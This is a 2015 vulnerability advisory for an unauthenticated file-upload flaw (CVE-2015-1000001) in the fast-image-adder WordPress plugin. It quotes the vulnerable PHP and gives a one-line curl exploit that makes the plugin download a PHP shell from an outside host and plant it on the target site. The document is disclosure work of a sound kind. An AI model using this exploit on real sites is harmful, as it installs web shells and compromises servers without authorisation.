| **Title:** Remote file upload vulnerability in fast-image-adder v1.1 Wordpress plugin |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2015-07-10 |
| **CVE-ID:**[[CVE-2015-1000001](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1000001)] |
| **CWE:** CWE-434 Unrestricted Upload of File with Dangerous Type |

| **Vendor Notified:**  2015-07-10 |
| **Vendor Contact:** plugins@wordpress.org |
| **Advisory:** <http://www.vapidlabs.com/advisory.php?v=139> |
| **Description:** Add images to your blog posts from a URL in a flash. Skip the download/upload steps and the slow WordPress dialog box. |
| **Vulnerability:**The fast-image-adder-uploader.php file doesn't check if a user is authorized to upload files: It creates a random file name, but reports the name back to the user. 60 $upload\_dir = wp\_upload\_dir(); 61 $path = $upload\_dir['path']; 62 $new\_filename = $suggested\_name\_filesystem . "\_" . random\_filename() . substr($url,strrpos($url,".")); 63 64 65 // If we are not in test mode, get the file and resize it 66 if ($test\_mode === FALSE) 67 { 68 $image\_data = file\_get\_contents($url); 69 file\_put\_contents($path . "/" . $new\_filename,$image\_data); 70 resize($path . "/" . $new\_filename, $new\_height, $new\_width, $val\_maxwidth, $path . "/" . $new\_filename); 71 } 72 73 $new\_url = $upload\_dir['url'] . "/" . $new\_filename; . . 83 if ($test\_mode === FALSE) 84 { 85 echo "Uploaded as " . $new\_url; 86 } |
| **Export:** [JSON](export_mitre_v4.py?id=139) [TEXT](txt.php?v=139) [XML](xml.php?s=139) |
| **Exploit Code:** ```   1. $ curl http://www.example.com/wp-content/plugins/fast-image-adder/fast-image-adder-uploader.php?confirm=url&url=http://192.168.0.2/shell.php 2. Shell location is reported back to the user with random filename.  The url site must not interpret php, but allow it for download.  ``` |
